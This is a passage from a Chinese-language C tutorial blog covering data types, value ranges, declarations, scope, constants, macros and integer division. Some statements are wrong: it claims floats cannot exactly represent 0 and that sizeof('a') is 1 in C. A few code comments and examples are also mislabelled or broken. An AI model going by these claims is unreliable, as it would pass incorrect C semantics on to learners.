class="number">-2</span>^<span class="number">31</span>~<span class="number">2</span>^<span class="number">31</span><span class="number">-1</span> </span><br><span class="line"><span class="type">signed</span> <span class="type">long</span> 长整型 <span class="number">4</span>字节/<span class="number">32</span>位</span><br><span class="line"><span class="type">signed</span> <span class="type">long</span> <span class="type">long</span> 超长整型 <span class="number">8</span>字节/<span class="number">64</span>位</span><br></pre></td></tr></table></figure><p>上面的所有的类型前面都有一个signed关键字,代表这个类型是有符号的(正负号),这个关键字是默认的,也就是说可以忽略,默认创建的变量都是有符号的.</p><p>那么同理,对应就有一系列无符号类型(只要把signed替换为unsigned),例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> 无符号超长整型 <span class="number">8</span>字节 大小比<span class="type">long</span> <span class="type">long</span> 翻了一倍</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span>;(如果程序只需要考虑正数)</span><br></pre></td></tr></table></figure><p>接下来讨论的<strong>数据范围</strong>的事情就要涉及到一点底层的知识了(其实没多少,需要自己去看补码的知识—见<code>CSAPP(《深入理解计算机系统》)</code>):</p><p>我们知道对于同样的一字节有:</p><p><strong>只表示正数</strong></p><p>1字节—8个bit位—最多能唯一表示0~255(正数)这些数<br>    00000000 原码<br>    0&#x2F;1 两种状态的全部组合有 2^8&#x3D;256种状态</p><p><strong>同时表示正负数</strong></p><p>首先来看一个问题:</p><p>​我们有1字节,想要最大限度的存储整数—带一个符号signed位+剩下7位有效数字,那么对于0这个数有:</p><p>​0 0000000 +0 </p><p>​1 0000000 -0</p><p>​可以发现,如果我们仅仅简单的将各个数的二进制表示来存储的话,那么就会遇到这个问题,即00000000和10000000这两个编码都表示0,且一个是+0,一个是-0,显然从数学上是完全相等的,但是问题就在于,在计算机中,一个数的编码必须是唯一的,那么我们必须要解决这个正负零的问题,解决的方法就是将10000000解释为其他数,我们引入补码这种表示方法,将10000000解释为-128:</p><p>​0 0000000 +0<br>​1 0000000 -128 计算机补码</p><p>我们将256中状态分成几部分:<br>    256&#x3D;128(负数)+127(正数)+1(原点0)<br>也就是说我们实际上能够存储的整数范围就是-128~127</p><p>其实就是 128&#x3D;2^7—8位数实际上只有7位用来存储真正的数</p><p>同理16位—15位有数<br>    0 0000000 00000000 -2^15~2^15-1</p><p>那么可以推出对于k位有符号数,其存储范围是-2^(k-1)~2^(k-1)-1</p><p><code>注:这里只讨论了数据范围,暂时没有讨论补码的问题,感兴趣可以去看CSAPP中的相关章节,或者觉得看不懂百度也行,具体(预计)会在位运算进行讨论</code></p><h2 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h2><p>无法精确存储!!!无法精确存储!!!无法精确存储!!!重要的事情说3遍!!!</p><p>浮点数的存储比整数要复杂的多,这并不是C语言的特性,而是计算机对浮点数的存储方式与整数完全不同.现在的浮点数存储已经标准化,都遵循IEEE的标准(具体内容可以自行查询).</p><p>那么由于浮点数存储方式的特殊性(基于科学计数法),导致其虽然总体范围较大,但是却无法精确表示.</p><p><strong>重要的关键点</strong>:C语言中的浮点数(或者说IEEE标准的浮点数)无法精确表示0,无法精确表示无限小数,但可以表示无穷大和NaN(not a number)</p><p>C语言的浮点数主要有两种:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">double</span> 双精度浮点型 <span class="number">8</span>字节/<span class="number">64</span>位 精度<span class="number">16</span> 最多小数点后<span class="number">6</span>位</span><br><span class="line"><span class="type">float</span> 单精度浮点型 <span class="number">4</span>字节/<span class="number">32</span>位 精度<span class="number">8</span> 最多小数点后<span class="number">6</span>位</span><br></pre></td></tr></table></figure><p>还有一种用的很少的<code>long double</code>,在现在的机器中精度更高,但是过去是用于解决兼容性问题引入的</p><p>讨论到浮点数,这里举一个例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">double</span> num2 = <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.17f&quot;</span>,num2);</span><br><span class="line"><span class="comment">// 输出 0.30000000000000004</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出实际上浮点数是无法精确存储的,但是越接近0,分布越密集,也就越精确</p><p>ps:笔者对浮点数的了解也比较有限,正在学习中,目前还没有特别深刻的认识(学习漏洞之一,但是实际编程确实会认真考虑到相关问题)</p><h2 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h2><p>字符只有2种:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="type">signed</span>)<span class="type">char</span> 注意:极个别编译器默认为<span class="type">unsigned</span> <span class="type">char</span> 字符类型 <span class="number">1</span>字节 实际上就类似是一个<span class="number">1</span>字节的<span class="type">int</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span></span><br></pre></td></tr></table></figure><p>字符实际上存的是字符的ASCII码值(正整数)— -128~127<br>-128————0————-127(环—溢出问题)<br>char可以用于算术运算—因为实际上就是个数字</p><p>同时还有一个很多书不会提到,或者说讲的不明确的问题,那就是字符常量到底和int一不一样,这里举一个代码例子,要用到sizeof运算符:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> c=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;char c: %u\n&quot;</span>,<span class="keyword">sizeof</span>(c));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;char: %u\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;int: %u\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\&#x27;a\&#x27;: %u\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&#x27;a&#x27;</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\&#x27;a\&#x27;+1: %u\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&#x27;a&#x27;</span> + <span class="number">1</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\&#x27;a\&#x27;+1: %u\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&#x27;a&#x27;</span> + <span class="string">&#x27;a&#x27;</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出结果:</span></span><br><span class="line"><span class="comment">char: 1</span></span><br><span class="line"><span class="comment">int: 4</span></span><br><span class="line"><span class="comment">&#x27;a&#x27;: 1</span></span><br><span class="line"><span class="comment">&#x27;a&#x27;+1: 4</span></span><br><span class="line"><span class="comment">&#x27;a&#x27;+1: 4</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>这里使用sizeof关键字计算操作数的大小(宽度),也就是占用几字节.</p><p>可以发现,单个字符常量&#x2F;单个字符变量都占用1字节,而int常量(变量)占用4字节</p><p>但是,一旦char加入了和int整型的运算,那么结果的大小就会立即变成4字节</p><p>甚至只是两个字符常量进行相加(字符对应的ASCII码值相加,而不是连接),结果也立即提升为4字节</p><p>所以我们可以证实:<code>在C语言中,单个的字符常量是1个字节,但是一旦参与运算,就立即提升为4字节,也就是说被解释为(当做)4字节的int常量参与运算</code></p><p>换句话说,你完全可以把C语言中的字符常量当成int来看待!!!这是一个很重要的特性,很多教材,书中都没有提到,或者讲解的不够清晰.</p><h2 id="其他特殊类型"><a href="#其他特殊类型" class="headerlink" title="其他特殊类型"></a>其他特殊类型</h2><p>其他的特殊类型非常重要,但是这里先不进行讲解,本文的主要目的是要让各位建立起对数据类型及其表示范围的概念,后面的几种类型会单独分章节进行讨论,特别是指针,堪称C语言的灵魂,放在好几章里讲解都不为过,甚至在后面的各种应用都离不开指针.</p><h1 id="C语言的数据"><a href="#C语言的数据" class="headerlink" title="C语言的数据"></a>C语言的数据</h1><p>C语言中,数据有两种,即常量和变量;</p><p>还有一种实际上属于变量,但是常常被称为常量,或者常变量的数据,就是在变量声明的适当位置加上const这个关键字;</p><p>另外有一种特殊的常量,叫做宏定义,实际上是一种预处理,只是单纯的文本替换,同样十分重要.</p><h3 id="如何声明一个变量"><a href="#如何声明一个变量" class="headerlink" title="如何声明一个变量"></a>如何声明一个变量</h3><p>注:有关声明的详细内容可见<a href="https://zh.cppreference.com/w/c/language/declarations,%E5%85%B6%E4%BB%96%E5%A3%B0%E6%98%8E%E5%B0%86%E4%BC%9A%E5%9C%A8%E5%90%8E%E7%BB%AD%E7%9F%A5%E8%AF%86%E7%9A%84%E8%AE%B2%E8%A7%A3%E4%B8%AD%E9%80%90%E6%B8%90%E6%8F%92%E5%85%A5">https://zh.cppreference.com/w/c/language/declarations,其他声明将会在后续知识的讲解中逐渐插入</a>.</p><p>变量,顾名思义,就是可以变化的量,用于在程序中存储不断变化的值,或者用于接受我们输入的值(在运行前不确定).</p><p>并且变量不同于常量,在使用前必须进行声明—提前告知编译器这里需要使用到一个变量(需要进行内存分配).</p><p>如前所述,C语言是静态类型语言,声明一个变量,则必须声明其类型(编译前就必须确定其类型):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a; <span class="comment">// 正确,a是一个int类型的变量</span></span><br><span class="line"><span class="type">double</span> pi=<span class="number">3.14</span>; <span class="comment">// 正确,pi是一个double类型的变量,并为其初始化为3.14</span></span><br><span class="line">    <span class="type">float</span> f1=<span class="number">2</span>,f2=<span class="number">3</span>,f3=<span class="number">4</span>; <span class="comment">// 正确,同一条语句中可以声明若干个变量</span></span><br><span class="line">    s; <span class="comment">// 错误,s未定义</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2lf&quot;</span>,pi); <span class="comment">// 输出pi的值,且保留2位小数</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="变量的声明方法"><a href="#变量的声明方法" class="headerlink" title="变量的声明方法"></a>变量的声明方法</h4><p>一个变量声明,遵循以下格式:</p><p>​<code>&lt;类型&gt; &lt;合法的标识符名&gt;;</code></p><p>类型即为上面所述的各种合法的内置类型,或者是自定义的类型(例如结构体类型,枚举类型等等);</p><h4 id="标识符的命名规则"><a href="#标识符的命名规则" class="headerlink" title="标识符的命名规则"></a>标识符的命名规则</h4><p>标识符即为变量名,在C语言中,标识符的命名有如下几条规则,不遵循这几条规则的标识符均不合法(或者不合适):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> 标识符必须以字母a-z、 A-Z或下划线开头，后面可跟任意个(可为<span class="number">0</span>)字符，这些字符可以是字母、下划线和数字，其他字符不允许出现在标识符中</span><br><span class="line"><span class="number">2</span> 标识符严格区分大小写字母</span><br><span class="line"><span class="number">3</span> 标识符的长度，c89规定<span class="number">31</span>个字符以内，c99规定<span class="number">63</span>个字符以内(没有哪个疯子超出这个范围吧...)</span><br><span class="line"><span class="number">4</span> C语言中的关键字，有特殊意义，不能作为标识符(例如<span class="keyword">if</span>,<span class="keyword">for</span>,<span class="keyword">while</span>,<span class="keyword">goto</span>,<span class="keyword">return</span>等)</span><br><span class="line"><span class="number">5</span> 自定义标识符最好取具有一定意义的字符串，便于记忆和理解</span><br><span class="line"><span class="number">6</span> 不同平台最好遵循各自的命名规范,例如Windows一般使用驼峰命名法,Linux使用下划线命名法</span><br></pre></td></tr></table></figure><p>不好意思地指出,本人的英语水平不太好,而且各种标识符(包括但不限于变量名,函数名,结构体类型,宏定义等)都习惯下划线命名法,可能较长.但希望宁肯变量名长点,也不要一大堆a,b,c,d,e,f,g之类的扔上去,否则以后回头看代码遭罪的只会是你自己.</p><h4 id="变量从哪里声明"><a href="#变量从哪里声明" class="headerlink" title="变量从哪里声明"></a>变量从哪里声明</h4><p>这里的知识可能涉及到一点作用域和生命周期的问题,但是这里先不讲解—依旧,知识都是交叉的,在该讲什么的时候就讲什么.</p><p>其实核心的就是一句话:<code>在你使用到该变量之前提前声明好他</code></p><p>例如上面的<code>double pi=3.14;</code>我们需要在后面进行输出其值,所以必须在使用printf之前进行该变量的声明,同时对其进行初始化(初始化为3.14).这里的pi在main函数中声明,所以pi也叫<code>局部变量</code>,换句话说,在其他地方(其他函数中)是不允许使用该变量的(找不到pi),因为pi是main()函数私有的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;访问到了pi:%lf&quot;</span>,pi); <span class="comment">// error: &#x27;pi&#x27; was not declared in this scope</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">double</span> pi=<span class="number">3.14</span>; <span class="comment">// 正确,pi是一个全局的double类型的变量,并为其初始化为3.14,main函数可以访问到</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2lf\n&quot;</span>,pi); <span class="comment">// 输出pi的值,且保留2位小数</span></span><br><span class="line">    test();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这个程序无法通过编译,因为在test函数中无法访问到pi这个变量.</p><p>但是如果我们把pi放在main()函数的前面,同时在任何函数的外面,那么pi就成为了全局变量,任何函数(本源文件内)都有权限访问修改其值,并且pi在程序运行的整个过程一直存在而不会销毁(后面在作用域与生命周期的相关教程会详细解释):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">double</span> pi; <span class="comment">// 正确,pi是一个全局的double类型的变量,并为其初始化为3.14,main函数可以访问到</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;访问到了pi:%lf&quot;</span>,test);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2lf\n&quot;</span>,pi); <span class="comment">// 输出pi的值,且保留2位小数</span></span><br><span class="line">    test();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230921202743779.png" alt="image-20230921202743779" style="zoom:33%;" /><p>这里的示例主要体现了两种pi的作用域的不同,暂未展示生命周期的问题,大家现在只需要知道:如果需要一个变量给所有的函数共享,那么请将他作为全局变量,但是,这种操作一定要慎重,除非迫不得已,最好不要将任何变量声明为全局变量—你有可能会在某个函数中不小心修改(破坏)其值—请绝对不要高估你的实力与判断.</p><h3 id="如何使用一个常量"><a href="#如何使用一个常量" class="headerlink" title="如何使用一个常量"></a>如何使用一个常量</h3><h4 id="常量和变量的区别"><a href="#常量和变量的区别" class="headerlink" title="常量和变量的区别"></a>常量和变量的区别</h4><p>其实这个问题很显而易见,常量就是不能(或者说不应该)被修改值的量,从逻辑的角度去想,如果某个要被使用到的值确定不会(甚至是绝对不能)被修改(例如宇宙的普朗克常量),那么何不将其直接作为常量写入呢,这是一种思路,下面按照这个思路来写一个求圆表面积的程序:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">double</span> r=<span class="number">3</span>; <span class="comment">// 用于存储半径</span></span><br><span class="line"><span class="type">double</span> c; <span class="comment">// 用于存储面积</span></span><br><span class="line">c=<span class="number">3.14</span>*r*r;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lf&quot;</span>,c); <span class="comment">//输出28.260000</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<code>3.14</code>就是一个浮点型的常量,我们直接将其硬编码到程序中.</p><p>但是有一个问题,如果我们手动指定pi的精度,那么pi就不得不每次进行修改,例如3.14,3.14159,3.1415926535,…如此直接修改程序就显得非常麻烦,而且每一个地方都要进行手动修改,十分繁琐,与其这样,我们还不如将其定义为一个变量.</p><p>但是不得不承认,这里的例子破坏了<code>常量就是不能(或者说不应该)被修改值的量</code>这个前提,但是我们为了说明问题,暂时违反一次…另一方面,我们并不是只有这两种选择,在C中,我们有一种特殊的定义”常量”的方法,那就是<code>宏定义</code>.</p><p>宏定义实际上只是完完全全的文本替换,他类似于你在文本编辑器中”ctrl+h”进行批量的文本替换,我们见如下示例:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PI 3.14</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">double</span> r=<span class="number">3</span>; <span class="comment">// 用于存储半径</span></span><br><span class="line"><span class="type">double</span> c; <span class="comment">// 用于存储面积</span></span><br><span class="line">c=PI*r*r;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lf\n&quot;</span>,c); <span class="comment">//输出 28.260000</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;PI的值为:%lf\n&quot;</span>,PI); <span class="comment">//输出 PI的值为:3.140000</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>宏定义的定义格式是这样:</p><p><code>#define &lt;宏名&gt; [要替换的内容,可为空]</code></p><p>那么在上面的代码中,我们将程序中所有的PI全部替换成3.14</p><p>可以发现,宏定义实际上是预处理指令(#号代表预处理),也就是说在编译前宏就已经被替换了,所以说宏只是单纯的文本替换</p><p>另一方面,宏处理是从上向下依次执行的,如果先执行的宏替换之后,替换的地方又出现了后执行的宏需要替换的地方,那么这个地方仍然会被再次进行处理,以此类推,直到所有的宏全部被替换完成.</p><p>关于宏的知识还有其他内容,有的用的比较少,有的现在还不能讲解,读者不妨自行查阅—例如”宏函数”,”拼接宏”,”递归宏”等等高级(抽象)用法,有些其实基本不会用到,而有些会常常用到,需要不断的代码积累.</p><h4 id="常量有哪些"><a href="#常量有哪些" class="headerlink" title="常量有哪些"></a>常量有哪些</h4><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230923162631074.png" alt="image-20230923162631074"></p><p>实际上很简单的说,单个的数字(例如<code>123</code>,<code>3</code>等),单个的字符(例如<code>&#39;a&#39;</code>),单个的字符串(例如<code>&quot;hello world&quot;</code>),一些编译器预先定义好的常量(例如<code>NULL,其值是0</code>)这些都是合法的常量(或字面量)</p><h4 id="常量的存储问题"><a href="#常量的存储问题" class="headerlink" title="常量的存储问题"></a>常量的存储问题</h4><p>接下来是常量的存储问题.和变量不同,常量存储在常量存储区,而不是像局部变量存储在栈区,全局,静态变量存储在全局(静态)存储区里等等.</p><p>而且字符串是在一个字符常量区中,而且对字符串常量的引用(注意不是C++的引用,而是指使用),实际上是一个指向字符串第一个字符的字符指针,而且一个C程序共享同一个字符串常量—这意味着如果两个字符指针指向同一个字符串常量,那么在内存中实际只有一个这个字符串常量的副本!!!更重要的是,对一个字符串常量进行修改的行为是未定义的!!!有关字符指针的内容会在指针或字符串的相关章节进行详细的讲解(一般的教材是不会讲的doge)</p><h4 id="介于常量和变量之间—常变量的使用"><a href="#介于常量和变量之间—常变量的使用" class="headerlink" title="介于常量和变量之间—常变量的使用"></a>介于常量和变量之间—常变量的使用</h4><p>常变量实质上就是变量,我们使用一个const关键字对变量进行修饰,让他的值不能够被修改:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PI 3.14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> S </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> num=<span class="number">10</span>; <span class="comment">// num的值不可被修改</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,num);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>const提供语言层面的保护,编译器会进行一定程度上的识别,如果有修改的行为会进行报错—除了使用指针进行强行修改,但是此时一般程序会直接终止.</p><p>关于const关键字相关的知识将在指针进行更加详细的讲解.</p><p>​—WAHAHA,2023.9.21</p><h1 id="如何使用数据"><a href="#如何使用数据" class="headerlink" title="如何使用数据"></a>如何使用数据</h1><p>在此处,我们先引入最基本的几个运算:<code>加减乘除和赋值</code></p><p>对于数据,必然要进行操作使用,我们可以使用最基本两种操作方式:</p><p>1.变量或常量之间可以进行组合运算,例如<code>加减乘除</code>等,并计算出一个最终的值</p><p>3.把计算出的最终的值<code>赋值</code>给一个<code>左值</code>(后面会介绍到左值,这里简单将左值理解为就是<code>变量</code>)</p><h3 id="变量的初始化"><a href="#变量的初始化" class="headerlink" title="变量的初始化"></a>变量的初始化</h3><p>数据的操作处理,主要和变量有关,常量作为辅助.那么一个变量,在进行操作之前,应当给他一个初始的值,我们把这种操作叫做<code>初始化</code>.</p><p>例如,我们想要定义一个pi的浮点型变量,并初始化为3.14,应该这样写:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">float</span> pi = <span class="number">3.14</span>;</span><br></pre></td></tr></table></figure><p>也就是说,我们在声明这个变量的同时,直接在pi这个标识符后面跟一个<code>=</code>运算符,后面再跟其初始值即可.</p><p>这里的<code>=</code>叫做<code>赋值运算符</code>, 它的功能是将其右边的”值”赋值给左边的”变量”.</p><p>另一方面,必须要注意的是,赋值运算符在这里实际上并不是赋值的操作,虽然我们使用了<code>=运算符</code>—这显然很符合我们的思维,但是正如标题所写,这里的操作叫做<code>初始化</code>而非<code>赋值</code>!</p><h3 id="为变量赋值"><a href="#为变量赋值" class="headerlink" title="为变量赋值"></a>为变量赋值</h3><p>我们在程序的运行当中,一些变量的值会发生变化,也就是说需要重新给他赋一个新的值,那么这时候的操作就叫做<code>赋值</code>,这里使用的<code>=运算符</code>才是真正的赋值含义.</p><p>例如,我们定义的一个变量原来是3,此时我们想要将其重新变为4,应该这样写:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> var = <span class="number">3</span>; <span class="comment">// 这里是初始化而非赋值</span></span><br><span class="line">var = <span class="number">4</span>; <span class="comment">// 这里进行赋值</span></span><br></pre></td></tr></table></figure><h3 id="变量-x2F-常量间进行运算"><a href="#变量-x2F-常量间进行运算" class="headerlink" title="变量&#x2F;常量间进行运算"></a>变量&#x2F;常量间进行运算</h3><p>很显然,我们使用<code>+-*/</code>这4个运算符进行四则运算,他们的运算行为和数学意义完全相同,例如如果除数是0则会出现错误.</p><p>例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">3</span>, b = <span class="number">4</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, a + b);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然,输出的结果是<code>7</code></p><p>又如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">8</span>, b = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, a / b);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然,输出的结果是<code>4</code></p><p>那么问题来了,这个程序输出的是什么:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">3</span>, b = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, a / b);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你觉得输出的是<code>1.5</code>,那么很遗憾,你完全忽略了上面讲的数据类型的知识!</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230923155340995.png" alt="image-20230923155340995" style="zoom:33%;" /><p>运行结果可能出乎你的预料,是<code>1</code>!原因很简单,a和b都是int类型,那么很自然的,C语言没有理由自动的为你将a&#x2F;b作为一个double类型的值,而是只会是一个int,那么实际上1.5的0.5被忽略了,而且是直接舍弃,没有四舍五入.</p><p>换句话说, 